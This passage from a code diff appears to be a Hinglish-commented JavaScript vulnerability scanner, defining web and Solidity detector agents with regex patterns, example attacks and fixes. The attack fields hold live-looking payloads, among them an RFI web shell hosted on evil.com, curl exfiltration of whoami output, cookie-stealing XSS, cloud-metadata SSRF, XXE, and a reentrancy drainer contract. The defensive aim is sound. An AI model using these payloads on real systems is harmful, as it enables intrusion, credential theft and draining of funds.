+      "→ victim ke cookies ke saath transfer chal jayega."],
+ def:["// 1. Server-side CSRF token har state-changing form me:",
+      "<input type='hidden' name='_csrf' value='<?= $_SESSION['csrf'] ?>'>",
+      "// 2. Cookie me SameSite=Lax/Strict + critical actions pe re-auth (password/OTP)"]},
+
+{id:"SSRF-PROBE", nm:"SSRF Probe", dom:"WEB", sev:"HIGH",
+ d:"Server-side fetch user-controlled URL pe — internal network (169.254.169.254 metadata, localhost) scan ho sakta hai.",
+ pats:[
+  {re:/fetch\s*\(\s*(?:req\.|params\.|query\.|body\.|getUrlParam)/gi, lb:"fetch(request-controlled URL)"},
+  {re:/(?:axios|http|https)\s*\.\s*(?:get|post|request)\s*\(\s*(?:req\.|params\.|query\.)/gi, lb:"axios/http + user URL"},
+  {re:/new\s+URL\s*\(\s*(?:req\.|params\.|query\.)/gi, lb:"URL parse + user input"}],
+ atk:["target url param me internal endpoints:",
+      "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  → cloud keys leak",
+      "?url=http://localhost:6379/  → internal Redis; ?url=file:///etc/passwd (agar wrapper open ho)"],
+ def:["// 1. Allowlist — sirf approved domains:",
+      "const ALLOW = new Set(['api.trusted.com']);",
+      "if (!ALLOW.has(new URL(u).hostname)) return res.status(400).end();",
+      "// 2. DNS-resolved IP check: private ranges (10/172.16-31/192.168/169.254/127) block",
+      "// 3. redirects disable + metadata IP hard-block"]},
+
+{id:"LFI-CRAWLER", nm:"LFI Crawler", dom:"WEB", sev:"HIGH",
+ d:"File read path me user-input — ../../ traversal se server files (passwd, .env, secrets) padh li jaati hain.",
+ pats:[
+  {re:/readFile(?:Sync)?\s*\([^)\n]{0,60}(?:req\.|params\.|query\.|body\.)/gi, lb:"fs.readFile + request param"},
+  {re:/fs\.(?:read|createReadStream)[^)\n]{0,60}\+\s*\w+/gi, lb:"fs path concat"}],
+ atk:["GET /download?file=../../../../etc/passwd",
+      "GET /download?file=..%2f..%2f..%2fetc%2fpasswd   (URL-encoded bypass)",
+      "LINUX: /proc/self/environ se env secrets; Windows: ..\\..\\windows\\win.ini"],
+ def:["const BASE = path.resolve('/srv/app/uploads');",
+      "const p = path.resolve(BASE, req.query.file);",
+      "if (!p.startsWith(BASE + path.sep)) return res.status(403).end();  // jail check",
+      "// + filename allowlist / UUID-based stored names — user path kabhi direct nahi"]},
+
+{id:"RFI-INVADER", nm:"RFI Invader", dom:"WEB", sev:"CRITICAL",
+ d:"Remote URL include/fetch se attacker apna code server pe chala sakta hai (agar wrapper open ho).",
+ pats:[
+  {re:/(?:include|require)(?:_once)?\s*\(\s*["']https?:\/\//gi, lb:"remote include literal"},
+  {re:/(?:include|require)(?:_once)?\s*\([^)\n]{0,50}(?:\$_GET|\$_POST|\$_REQUEST|params|url)/gi, lb:"include + user input"}],
+ atk:["?page=https://evil.com/shell.txt   → shell.txt me: <?php system($_GET['c']); ?>",
+      "→ server pe full RCE: /rce.php?c=whoami"],
+ def:["// include me variable kabhi nahi — fixed switch use karo:",
+      "const PAGES = {home:'home.js', about:'about.js'};",
+      "const f = PAGES[req.query.page] ?? 'home.js';   // allowlist map",
+      "// php.ini: allow_url_include=Off (default) — kabhi On mat karna"]},
+
+{id:"XXE-BREAKER", nm:"XXE Breaker", dom:"WEB", sev:"HIGH",
+ d:"XML parser external entities resolve kar raha hai — file read + SSRF (internal port scan) possible.",
+ pats:[
+  {re:/libxml_disable_entity_loader\s*\(\s*false\s*\)/gi, lb:"entity loader force-enabled"},
+  {re:/(?:new\s+DOMParser|xml\.parse(?:XML|FromString)?|parseXml|simplexml_load_string)\s*\(/gi, lb:"XML parse sink"},
+  {re:/LIBXML_NOENT|resolveEntities\s*=\s*true/gi, lb:"external entities ON"}],
+ atk:["<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
+      "Cloud pe: <!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'> → SSRF via XML"],
+ def:["libxml_disable_entity_loader(true);        // PHP <8",
+      "// libxml2: XML_PARSE_NOENT flag use MAT karo; DOMParser (browser) entities by-default safe",
+      "// best: JSON bhejo — XML hi chahiye to parser ko external entities disable karke instantiate karo"]},
+
+{id:"CMD-INJECTOR", nm:"Command Injector", dom:"WEB", sev:"CRITICAL",
+ d:"OS command me user-input concat — shell metacharacters (; | && $()) se arbitrary command chalti hai.",
+ pats:[
+  {re:/(?:child_process\.(?:exec|execSync)|\bexec(?:Sync)?\s*\(|\bsystem\s*\(|shell_exec\s*\(|passthru\s*\(|popen\s*\()\s*\([^)\n]{0,70}(?:\+|\$\{|`\|\breq\b|\$_(?:GET|POST|REQUEST)|params|query|input)/gi, lb:"command exec + concat"},
+  {re:/(?:exec|system|spawn)\s*\(\s*["'`][^"'`\n]{3,60}["'`]\s*\+\s*\w/gi, lb:"exec literal+var"}],
+ atk:["?host=127.0.0.1; cat /etc/passwd",
+      "?host=127.0.0.1%0Aid        (%0A = newline — filter bypass)",
+      "?host=$(curl https://evil.com/$(whoami))   → command substitution"],
+ def:["// 1. Shell avoid karo — direct API:",
+      "const { execFile } = require('child_process');",
+      "execFile('ping', ['-c','1', host], cb);   // args array — shell interpret nahi hota",
+      "// 2. Input validate: /^\\d{1,3}(\\.\\d{1,3}){3}$/ (IP format) → warna reject"]},
+
+{id:"PATH-TRACER", nm:"Path Tracer", dom:"WEB", sev:"HIGH",
+ d:"path.join / open() me request-param — traversal + absolute path injection (path.join('/x', '/etc/passwd') → /etc/passwd!).",
+ pats:[
+  {re:/path\.join\s*\([^)\n]{0,60}(?:req\.|params\.|query\.|body\.)/gi, lb:"path.join + request param"},
+  {re:/(?:fs\.)?open\s*\([^)\n]{0,50}(?:\$_GET|req\.params|req\.query)/gi, lb:"open + param"}],
+ atk:["GET /files?name=/etc/shadow          → path.join(base,'/etc/shadow') = '/etc/shadow' (absolute override!)",
+      "GET /files?name=../../.env            → env secrets leak"],
+ def:["const safe = path.basename(req.query.name);   // '..' & slashes strip",
+      "const p = path.join(UPLOADS, safe);",
+      "// + resolve().startsWith(UPLOADS+sep) double-check — defense in depth"]},
+
+{id:"REDIRECT-SHADOW", nm:"Open Redirect Shadow", dom:"WEB", sev:"MEDIUM",
+ d:"Redirect target user-controlled — phishing campaigns me tumhara trusted domain use hota hai.",
+ pats:[
+  {re:/window\.location(?:\.href)?\s*=\s*(?:getUrlParam|params|query|req\.)/gi, lb:"JS redirect + param"},
+  {re:/res\.redirect\s*\([^)\n]{0,50}(?:req\.|params\.|query\.)/gi, lb:"server redirect + param"},
+  {re:/(?:header|Location)\s*[:(]\s*["']Location:\s*["']?\s*\.\s*\$?_?GET/gi, lb:"Location header + GET"}],
+ atk:["https://trusted-bank.com/login?next=https://fake-bank-clone.com",
+      "→ user ko legit URL dikhta hai, land karta hai clone pe → creds chori."],
+ def:["// allowlist:",
+      "const ok = ['mysite.com/dashboard','mysite.com/profile'];",
+      "if (!ok.includes(target)) target = '/dashboard';",
+      "// ya sirf relative paths allow karo: if (!target.startsWith('/') || target.startsWith('//')) reject"]},
+
+{id:"IDOR-SCANNER", nm:"IDOR Scanner", dom:"WEB", sev:"MEDIUM",
+ d:"Object direct id se access — ownership check nahi dikha; koi bhi user kisi ka record padh/edit kar sakta hai.",
+ gate:(s)=>/(?:userId|user_id|ownerId|owner_id|belongsTo|\.owner\b)/i.test(s)?null:"ownership check dikha",
+ pats:[
+  {re:/(?:findById|findOne|WHERE\s+id|get\(\\?['\"]id)['\"]?\s*\)?[^)\n]{0,50}(?:req\.params|req\.query|params\.id|query\.id)/gi, lb:"fetch by id without owner scope"},
+  {re:/DELETE\s+FROM\s+\w+\s+WHERE\s+id\s*=\s*\$?\{?params/gi, lb:"delete by id, no owner"}],
+ atk:["Logged-in normal user: GET /api/invoice/1042 → 1043, 1044... enumerate karo",
+      "→ sab users ke invoices/PII. Burp Intruder se 1-10000 auto-scan."],
+ def:["// query me logged-in user bhi scope karo:",
+      "db.invoice.findFirst({ where: { id: req.params.id, ownerId: req.user.id } })",
+      "// → doosre ka record 404/403 milega. + random non-guessable IDs (UUID)"]},
+
+{id:"AUTH-BYPASSER", nm:"Auth Bypasser", dom:"WEB", sev:"CRITICAL",
+ d:"Loose comparison (==) ya client-trust pattern se auth bypass — magic value / true-string trick.",
+ pats:[
+  {re:/(?:password|token|role|isAdmin|admin)\s*(?:==|!=)[^=][^;\n]{0,40}["'][^"']{0,30}["']/gi, lb:"loose == compare with literal"},
+  {re:/if\s*\(\s*!?\s*req\.(?:headers\[["']x-admin|body\.isAdmin)\b/gi, lb:"client-controlled trust header/body"},
+  {re:/(?:isAdmin|role)\s*=\s*(?:req\.body|req\.query|req\.params)/gi, lb:"role client se assign"}],
+ atk:["JS loose compare: '0' == false → ?isAdmin=0 bypasses 'if (isAdmin == false)' checks",
+      "PHP: password == '0' magic-hash; JSON body me {\"isAdmin\":true} bhejo — server trust kare to game over."],
+ def:["// strict compare + server-side authority:",
+      "if (user.role !== 'admin') return res.status(403).end();",
+      "// role/flag HAMESHA server session/JWT-verified claims se — req.body se KABHI nahi",
+      "// === use karo (PHP: === ya password_verify())"]},
+
+{id:"SESSION-HIJACK", nm:"Session Hijacker", dom:"WEB", sev:"HIGH", once:true,
+ d:"Cookie me HttpOnly/Secure/SameSite flags nahi — XSS se cookie chori + network sniffing possible.",
+ gate:(s)=>/(?:httpOnly|httponly|secure\s*[:=]|sameSite|samesite)/i.test(s)?null:"",
+ pats:[
+  {re:/(?:res\.cookie|setcookie|Set-Cookie|cookies\.set)\s*\(/gi, lb:"cookie set — flags absent"}],
+ atk:["XSS payload: <img src=x onerror='new Image().src=\"//evil.com/?c=\"+document.cookie'>",
+      "→ HttpOnly na ho to JS cookie padh lega → session hijack. WiFi sniffing bhi (Secure flag absent)."],
+ def:["res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 3600000 });",
+      "// HttpOnly → JS access band | Secure → sirf HTTPS | SameSite → CSRF bhi kam",
+      "// + login pe session regenerate (fixation block)"]},
+
+{id:"HEADER-FORTRESS", nm:"Header Fortress", dom:"WEB", sev:"MEDIUM", once:true,
+ d:"Security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) missing — clickjacking, MIME-sniff, MITM.",
+ gate:(s)=>/(?:Content-Security-Policy|X-Frame-Options|helmet|Strict-Transport)/i.test(s)?null:"",
+ pats:[
+  {re:/(?:<html|<body|<head|res\.(?:send|json)|app\.get)/i, lb:"HTTP output — no security headers in source"}],
+ atk:["<iframe src='https://victim.com/delete-account' style='opacity:0'></iframe>",
+      "<button style='position:fixed;top:0;left:0;width:100%;height:100%'>WIN PRIZE</button>",
+      "→ X-Frame-Options absent = clickjacking. MITM pe script inject (HSTS absent)."],
+ def:["// Express: app.use(helmet()) — ya manually:",
+      "Content-Security-Policy: default-src 'self'",
+      "X-Frame-Options: DENY | Strict-Transport-Security: max-age=63072000 | X-Content-Type-Options: nosniff"]},
+
+{id:"TLS-INSPECTOR", nm:"TLS Inspector", dom:"WEB", sev:"LOW",
+ d:"Hardcoded http:// ya certificate verification disabled — MITM ke liye darwaza khula.",
+ pats:[
+  {re:/["']http:\/\/(?!localhost|127\.0\.0\.1)/gi, lb:"hardcoded http:// URL"},
+  {re:/rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*["']?0|verify\s*=\s*False/gi, lb:"cert verify disabled"}],
+ atk:["Same WiFi pe attacker ARP-spoof + sslstrip → http:// traffic me creds plain-text me aate hain.",
+      "rejectUnauthorized:false → fake cert se transparent proxy, poora TLS MITM."],
+ def:["// sab URLs https:// — HSTS bhi set karo",
+      "// cert verification kabhi disable nahi (dev me bhi local CA use karo)",
+      "// internal services: mTLS + cert pinning mobile apps me"]},
+
+{id:"INFO-LEAKER", nm:"Info Leaker", dom:"WEB", sev:"LOW",
+ d:"Secrets console/error me leak — attacker recon ka pehla step yahi hai (stack trace, keys, config).",
+ pats:[
+  {re:/console\.log\s*\([^)\n]{0,60}(?:password|passwd|token|secret|apiKey|api_key|credential)/gi, lb:"console.log + secret"},
+  {re:/(?:jwtSecret|secret|apiKey|password)\s*[:=]\s*["'][^"'\n]{4,50}["']/gi, lb:"hardcoded secret literal"},
+  {re:/res\.(?:json|send|status\(\d+\)\.send)\s*\(\s*(?:err|error|e)\s*\)/gi, lb:"raw error object to client"}],
+ atk:["500 error page pe stack-trace → framework version, file paths, DB creds env vars.",
+      "JS bundle me hardcoded key grep: trufflehog / git-secrets sab bundles pe chalte hain."],
+ def:["// secrets env me: process.env.JWT_SECRET (default values kabhi nahi)",
+      "// error handler: client ko generic message, detail sirf server log me",
+      "// production me console.log strip karo (terser drop_console)"]},
+
+{id:"UPLOAD-BREACHER", nm:"Upload Breacher", dom:"WEB", sev:"CRITICAL",
+ d:"File upload me type/ext validation nahi — shell.php.svg jaisi file webroot me rakh ke RCE.",
+ gate:(s)=>/(?:mimetype|mimeType|fileFilter|extension|whitelist|allowedTypes|pathinfo|getimagesize)/i.test(s)?null:"",
+ pats:[
+  {re:/(?:multer\(|\$_FILES|fileFilter|upload\.single|formidable)/gi, lb:"upload sink — validation absent"}],
+ atk:["shell.phtml / shell.php5 / shell.svg(with script) upload karo → /uploads/shell.phtml?c=whoami",
+      "Content-Type spoof: image/jpeg header + PHP code body — extension blacklists ko bypass.",
+      "Double-ext: photo.jpg.php, null-byte (legacy): shell.php%00.jpg"],
+ def:["// 1. Extension allowlist (whitelist, blacklist NAHI): jpg|png|webp",
+      "const ok = ['image/jpeg','image/png','image/webp'];",
+      "if (!ok.includes(file.mimetype)) throw new Error('bad type');",
+      "// 2. Random naam (original kabhi nahi) + webroot ke BAHAR store + serve via proxy/X-Content-Type-Options:nosniff",
+      "// 3. Image re-encode (sharp/PIL) — payload strip ho jata hai"]},
+
+{id:"DESERIAL-BOMB", nm:"Deserialization Bomb", dom:"WEB", sev:"CRITICAL",
+ d:"Untrusted data direct parse/instantiate — object injection se RCE tak (gadget chains).",
+ pats:[
+  {re:/(?:unserialize\s*\(|pickle\.loads\s*\(|yaml\.load\s*\((?![^)]*Loader)|Marshal\.load)/gi, lb:"unsafe deserializer"},
+  {re:/JSON\.parse\s*\([^)\n]{0,50}(?:req\.body|req\.query|getUrlParam)/gi, lb:"JSON.parse + raw request"}],
+ atk:["PHP: O:8:\"Template\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} — magic __destruct/__wakeup gadgets",
+      "Python pickle: __reduce__ → os.system. YAML: !!python/object/apply:os.system ['id']"],
+ def:["// PHP: unserialize() pe user-data KABHI — JSON use karo json_decode()",
+      "// Python: yaml.safe_load() (never yaml.load), pickle pe untrusted data nahi",
+      "// agar zaroori ho: allowed_classes: unserialize($d, ['allowed_classes' => false])"]},
+
+{id:"RATE-CRASHER", nm:"Rate Crasher", dom:"WEB", sev:"MEDIUM", once:true,
+ d:"Auth endpoint pe rate-limit nahi — credential stuffing / brute-force unlimited tries.",
+ gate:(s)=>/(?:rate.?limit|rateLimit|throttle|limiter|attempt)/i.test(s)?null:"",
+ pats:[
+  {re:/(?:\/login|\/signin|\/auth|password["']?\s*===?|bcrypt\.compare|verifyPassword)/i, lb:"auth flow — limiter absent"}],
+ atk:["Hydra/Burp Intruder: 10k common passwords @ 100 req/s — koi block nahi.",
+      "Credential stuffing: leaked combos list (email:pass) direct fire — MFA absent ho to full ATO."],
+ def:["// express-rate-limit:",
+      "app.use('/login', rateLimit({ windowMs: 15*60*1000, max: 5 }));",
+      "// + exponential backoff, CAPTCHA after 3 fails, password-breached-list check (HIBP)"]},
+
+{id:"JWT-FORGER", nm:"JWT Forger", dom:"WEB", sev:"HIGH",
+ d:"JWT weaknesses: 'none' algorithm, decode-without-verify, hardcoded secret — token forge ho sakta hai.",
+ pats:[
+  {re:/algorithm\s*:\s*["']none["']/gi, lb:"alg none allowed"},
+  {re:/jwt\.decode\s*\(/gi, lb:"decode() without verify"},
+  {re:/(?:jwt\.sign|sign)\s*\(\s*[^)\n]{0,80}(?:secret\s*[:=]\s*["'][^"']{3,40}["']|["'][a-zA-Z0-9]{6,30}["']\s*\))/gi, lb:"weak/hardcoded signing secret"}],
+ atk:["Header me {\"alg\":\"none\"} + payload {\"role\":\"admin\"} — koi signature nahi, server accept kare to admin.",
+      "Hardcoded secret GitHub leak → apne tokens sign karo. Weak secret → hashcat mode 16500 crack.",
+      "RS256→HS256 confusion: public key ko HMAC secret bana ke sign."],
+ def:["jwt.verify(token, SECRET, { algorithms: ['HS256'] });  // explicitly pin",
+      "// secret: 256-bit random env var (openssl rand -hex 32) — kabhi code me nahi",
+      "// decode() sirf inspection ke liye — trust decision verify() se"]},
+];
+
+/* ============ CHAIN DOMAIN — 26 Solidity agents (v2.4 STRICT PRAGMA knowledge) ============ */
+const AGENTS_CHAIN = [
+{id:"PRAGMA-ORACLE", nm:"Pragma Context Oracle", dom:"CHAIN", sev:"INFO",
+ d:"Declared pragma = absolute truth (Rule #1). Era detect karke sabhi detectors ko gate karta hai — assumption-free analysis.",
+ always:true,
+ pats:[{re:/pragma\s+solidity\s*[^;]+;/gi, lb:"pragma declaration"}],
+ atk:["— (ye agent info deta hai, attack nahi) —",
+      "Era MODERN (>=0.8): overflow/underflow compiler-built-in revert hai.",
+      "Era LEGACY (<0.8): arithmetic silent-wrap karta hai — OVERFLOW-WRAITH active hoga."],
+ def:["// Compiler version PIN karo: pragma solidity 0.8.24; (floating ^ avoid prod me)",
+      "// >=0.8 me bhi unchecked{ } blocks me overflow possible — wahan review double karo"]},
+
+{id:"REENTRANCY-VIPER", nm:"Reentrancy Viper", dom:"CHAIN", sev:"CRITICAL",
+ d:"External call ke BAAD state update — attacker fallback se wapas call karke balance dobara nikaal sakta hai (DAO hack pattern).",
+ pats:[
+  {re:/\.call\s*\{[\s\S]{0,80}?value:[\s\S]{0,80}?\}[\s\S]{0,60}?\)[\s\S]{0,200}?(?:balances|deposits|shares|credits|stakes)[\w\[\].\s]*\s*=\s*0/gi, lb:"call{value} → baad me balance=0 (CEI broken)"},
+  {re:/(?:\.transfer\s*\(|\.send\s*\(|\.call\s*\{)[\s\S]{0,300}?[\w.\[\]]*\s*\+=|=(?:[\s\S]{0,300}?\.call\s*\{|\s*\+\=)/gi, lb:"external call + state write same fn"},
+  {re:/(?:balances|deposits|credits|shares|amounts|stakes|claimed)\[[^\]]*\]\s*=\s*0[\s\S]{0,120}?\.(?:transfer|send|call)/gi, lb:"state=0 ke baad call (reversed CEI)"}],
+ skipIf:(m0)=>/nonReentrant/.test(m0),
+ atk:["contract Attacker {",
+      "  function pwn(address target) external payable { Vault(target).deposit{value: 1 ether}(); Vault(target).withdraw(); }",
+      "  receive() external payable { if (address(Vault(msg.sender)).balance >= 1 ether) Vault(msg.sender).withdraw(); }",
+      "}  // har re-entry pe balance abhi 0 nahi hua → vault poora drain",
+      "REAL CASE: The DAO 2016 — 3.6M ETH ($60M) isi se gaya tha."],
+ def:["// CHECKS → EFFECTS → INTERACTIONS (CEI) order:",
+      "uint256 amt = balances[msg.sender];",
+      "balances[msg.sender] = 0;            // EFFECTS pehle",
+      "(bool ok, ) = msg.sender.call{value: amt}(\"\");  // INTERACTIONS baad me",
+      "require(ok, \"fail\");",
+      "// + ReentrancyGuard.nonReentrant modifier (OpenZeppelin) — double protection"]},
+
+{id:"OVERFLOW-WRAITH", nm:"Overflow Wraith", dom:"CHAIN", sev:"HIGH",
+ d:"Era-gated (Rule #1+#2): LEGACY pragma (<0.8, SafeMath absent) pe arithmetic silent-wrap; MODERN pe sirf unchecked{} flag hota hai.",
+ gate:(src)=>{ 
+   const pm = src.match(/pragma\s+solidity\s*([^;]+);/);
+   if (!pm) return "pragma undeclared — wraith passive (assumption-free mode)";
+   const spec = pm[1];
+   const safe = /SafeMath/i.test(src);
+   const modern = /\^\s*0\.8|0\.8\s*\.\s*\d|>=\s*0\.8/.test(spec) && !/0\.[0-7]\./.test(spec);
+   if (modern && !/unchecked\s*\{/.test(src)) return "MODERN era (>=0.8) — checked arithmetic built-in, skip";
+   if (modern) return null;
+   if (safe) return "LEGACY era + SafeMath verified — wrapped ops safe";
+   return null;
+ },
+ pats:[
+  {re:/unchecked\s*\{[\s\S]{0,200}?(?:\+=|-=|\*=|\+\+|--)/gi, lb:"unchecked{} arithmetic (MODERN risk)"},
+  {re:/(?:balances|amount|total|supply|balance)[\w\[\].\s]*\s*(?:\+=|-=|\*=)[^;\n]*/gi, lb:"raw arithmetic (LEGACY risk)"}],
+ atk:["LEGACY (0.7.x, no SafeMath): balance 1 wei + withdraw(2 wei) → uint underflow → 2^256-1 wei!",
+      "becomeWhaleWith(1 token); transfer(victim, victim.balance+1);  → poora contract ka supply hi victim ke naam",
+      "BEC Token 2018: batchOverflow — $900M at risk, ek line: amount * 10**18 overflow."],
+ def:["// LEGACY: SafeMath wrap karo: using SafeMath for uint256; balances[to] = balances[to].add(amt);",
+      "// best: >=0.8.0 upgrade — compiler khud revert karta hai",
+      "// MODERN: unchecked{} sirf jab PROOF ho ki math safe hai (comment me reason likho)"]},
+
+{id:"TXORIGIN-PHANTOM", nm:"tx.origin Phantom", dom:"CHAIN", sev:"HIGH",
+ d:"Authorization tx.origin pe — phishing contract se victim ki identity hijack ho sakti hai.",
+ pats:[{re:/tx\.origin\s*(?:==|!=|===|\.call|\.transfer|\.send)|require\s*\(\s*tx\.origin/gi, lb:"tx.origin as auth"}],
+ atk:["contract Phish { function claim() external {",
+      "  if (msg.sender == tx.origin) { /* user khud call kar raha */ }",
+      "  Vault(0xVictim).withdraw();  // victim ne 'free NFT mint' click kiya → uski identity se call",
+      "} }"],
+ def:["// auth ke liye msg.sender hi use karo: require(msg.sender == owner);",
+      "// tx.origin sirf telemetry ke liye — permission/authorization me KABHI nahi"]},
+
+{id:"ACCESS-BREACH", nm:"Access Control Breach", dom:"CHAIN", sev:"CRITICAL",
+ d:"State-mutating function pe koi auth guard nahi (onlyOwner/require msg.sender absent) — koi bhi sensitive action kar sakta hai.",
+ pats:[
+  {re:/function\s+(?:set|update|change|withdraw|transfer|mint|burn|upgrade|pause|setFee|setTax)\w*\s*\([^)]*\)\s*(?:public|external)\s*(?:payable\s*)?\{/gi, lb:"sensitive fn — guard check"}],
+ atk:["function setFee(uint256 f) public { _fee = f; }  // koi bhi: setFee(100%)",
+      "→ attacker fee 100% set karke sab transfers se funds capture. RenBTC 2020 / Parity multisig 2017 — $150M+ isi class ka."],
+ def:["function setFee(uint256 f) external onlyOwner { require(f <= 1000, \"max 10%\"); _fee = f; }",
+      "// OpenZeppelin Ownable/AccessControl + capability-specific roles + timelock for critical params"]},
+
+{id:"UNCHECKED-CALL", nm:"Unchecked Call Agent", dom:"CHAIN", sev:"MEDIUM",
+ d:"Low-level call/send ka return-value ignore — transfer fail hua to state corrupt (funds stuck/lost accounting).",
+ pats:[{re:/(?:\.call\s*\{[^}]*\}\s*\([^;]*\)|\.send\s*\([^)]*\))\s*;/gi, lb:"call/send return ignored"}],
+ skipIf:(m0,src,idx)=>/require|if\s*\(|bool\s+\w+\s*=/.test(src.slice(idx, idx+140)),
+ atk:["payable(msg.sender).call{value: amt}(\"\");  // ok ignore — revert nahi hoga",
+      "→ receiving contract fail kare (gas grief/revert) to balances already 0, user ne paise nahi paaye."],
+ def:["(bool ok, ) = msg.sender.call{value: amt}(\"\");",
+      "require(ok, \"ETH transfer failed\");   // ya revert pattern with pull-payment fallback"]},
+
+{id:"HONEYPOT-EYE", nm:"Honeypot Eye", dom:"CHAIN", sev:"CRITICAL",
+ d:"Classic honeypot signals: tax/fee setters, blacklist, trading-pause — buy chalega, sell time pe trap.",
+ pats:[
+  {re:/function\s+(?:modify(?:Tax|Fees)|set(?:Taxes|Fees|MaxTx|MaxWallet|TaxRate))\s*\(/gi, lb:"tax/fee setter present"},
+  {re:/(?:_isBlacklisted|isExcluded|blacklist)\s*\[[^\]]*\]\s*=\s*true/gi, lb:"blacklist mechanism"},
+  {re:/function\s+(?:setTrading|enableTrading|openTrading|tradingOpen)\s*\(/gi, lb:"trading switch"},
+  {re:/(?:_taxFee|_liquidityFee|_sellFee|sellTax|buyTax)\s*=\s*\d+/gi, lb:"hardcoded tax state"}],
+ atk:["ATTACKER VIEW (tum pe ho raha hoga):",
+      "1. buy tax 2% dikha — lekin setFees(2500) setter owner ke paas → sell pe 25% tax instantly",
+      "2. blacklist[buyer]=true → tumhara sell revert forever",
+      "3. setTrading(false) after LP add → rug window",
+      "CHECK: owner ka setFees call history + sell simulation mainnet fork pe karo."],
+ def:["// tax immutable/paid-start me fix karo, setter ho to hard cap + timelock:",
+      "function setSellTax(uint256 bps) external onlyOwner { require(bps <= 300, \"max 3%\"); emit TaxChanged(bps); }",
+      "// blacklist mechanic remove karo — community trust ka base yahi hai",
+      "// renounceOwnership AFTER deploy, verified source, LP lock public"]},
+
+{id:"MINT-RULER", nm:"Mint Ruler", dom:"CHAIN", sev:"CRITICAL",
+ d:"mint function bina auth guard — koi bhi unlimited tokens mint kar sakta hai (infinite supply = price 0).",
+ pats:[{re:/function\s+mint\s*\([^)]*\)\s*(?:public|external)[^;{]*\{/gi, lb:"mint() — guard scan"}],
+ skipIf:(m0)=>/onlyOwner|onlyMinter|require\s*\(/.test(m0),
+ atk:["// guard absent ho to:",
+      "TargetToken(t).mint(attackerAddr, 10**30);  → supply ×1000, dump → price 0",
+      "STOLEN case: OneRing / many BSC tokens — open mint se overnight rug."],
+ def:["function mint(address to, uint256 amt) external onlyOwner {",
+      "  require(totalSupply() + amt <= MAX_SUPPLY, \"cap\");  _mint(to, amt); }",
+      "// + cap constant + mint event + timelock"]},
+
+{id:"BLACKLIST-TRAP", nm:"Blacklist Trap", dom:"CHAIN", sev:"HIGH",
+ d:"Blacklist flag transfer me enforced — buyer ko sell se lock karne ka trap (honeypot core).",
+ pats:[{re:/(?:require\s*\(\s*!?\s*[\w_]*isBlacklisted|_blacklist\s*\[)/gi, lb:"blacklist enforcement in transfers"}],
+ atk:["Tum buy karo → owner ne tumhe blacklist karda → sell() revert 'blacklisted'",
+      "→ tokens locked forever, owner apne shares top pe dump karta hai."],
+ def:["// blacklist mechanic ko design se hatao — ya agar regulatory zaroorat hai:",
+      "// public blacklist history + no-add-after-launch + multisig + timelock (24h notice)"]},
+
+{id:"PAUSE-AMBUSH", nm:"Pause Ambusher", dom:"CHAIN", sev:"HIGH",
+ d:"pause/unpause control unsafe — unpause me owner-only absent, ya pause se user funds lock.",
+ pats:[{re:/function\s+(?:pause|unpause|setPaused|pauseTrading)\s*\([^)]*\)\s*(?:public|external)[^;{]*\{/gi, lb:"pause fn — guard scan"}],
+ atk:["unpause() bina guard → attacker pause toggling se MEV chaos / transfer griefing.",
+      "pause() + owner-only unpause → user funds indefinite lock (soft-rug)."],
+ def:["function pause() external onlyOwner { _paused = true; emit Paused(msg.sender); }",
+      "// Pausable (OZ) inherit + unpause pe timelock + max pause duration limit"]},
+
+{id:"FEE-VAMPIRE", nm:"Fee Vampire", dom:"CHAIN", sev:"HIGH",
+ d:"Fee/tax setter bina cap — baad me 100% tax laga ke sab funds capture.",
+ pats:[{re:/function\s+set(?:Fees|Tax|Fee|SellFee|BuyFee)\w*\s*\([^)]*\)\s*(?:public|external)/gi, lb:"fee setter — cap scan"}],
+ atk:["Launch pe fee 1% → community build → owner setFees(10000) (100%) →",
+      "har transfer me poora amount tax me → users zero, owner sab. Yehi ' stealth rug' hai."],
+ def:["require(newFeeBps <= 500, \"hard cap 5%\");  // immutable MAX_FEE constant bhi rakh lo",
+      "// fee change 24h timelock + event — snipe protection community ko dikhe"]},
+
+{id:"RUG-PULLER", nm:"Rug-Pull Detector", dom:"CHAIN", sev:"CRITICAL",
+ d:"Rug enablers: renounceOwnership + owner-exclusive withdraw/rescue combo — liquidity exit path.",
+ pats:[
+  {re:/function\s+\w*(?:withdraw|rescue|retrieve|claim|sweep)\w*\s*\([^)]*\)\s*(?:public|external)[^;{]*onlyOwner/gi, lb:"owner-only funds exit"},
+  {re:/renounceOwnership\s*\(\s*\)/gi, lb:"renounceOwnership present"},
+  {re:/function\s+set(?:SwapAndLiquify|Fees|Marketing)[^;{]*\{[\s\S]{0,100}?transfer[\s\S]{0,60}?marketing|marketingWallet\s*=/gi, lb:"marketing wallet reroute"}],
+ atk:["Classic rug sequence: 1) LP add+honeypot buys 2) owner withdraw/rescue ALL LP+tokens",
+      "3) renounceOwnership (irreversible look) 4) LP remove → price → 0. 99% BSC rugs isi pattern me."],
+ def:["// withdrawal user-specific hona chahiye (mapping[owner]) — contract-level treasury exit na ho",
+      "// rescue() sirf accidental tokens ke liye: timelock + multisig + cap + event",
+      "// LP lock 1yr+ (Team Finance/UNCX) public proof + vesting contract for team allocation"]},
+
+{id:"DELEGATE-HIJACK", nm:"Delegate Hijacker", dom:"CHAIN", sev:"CRITICAL",
+ d:"delegatecall user-controlled context me — storage collision se full contract takeover.",
+ pats:[{re:/\.\s*delegatecall\s*\(/gi, lb:"delegatecall sink"}],
+ atk:["Proxy me implementation address setter bina guard → attacker apna contract point kare →",
+      "storage slot 0 (owner) overwrite → contract ka saara funds + logic control. Parity Wallet 2017: $280M frozen isi se."],
+ def:["// implementation setter: onlyOwner + timelock + initializer pattern",
+      "function upgradeTo(address impl) external onlyOwner timelocked { require(impl != address(0)); _impl = impl; }",
+      "// UUPS/Transparent proxy OZ standards + storage layout append-only"]},
+
+{id:"SUICIDE-WATCH", nm:"Suicide Watch", dom:"CHAIN", sev:"CRITICAL",
+ d:"selfdestruct unprotected — contract destroy + forced-ETH vector.",
+ pats:[{re:/selfdestruct\s*\(/gi, lb:"selfdestruct present"}],
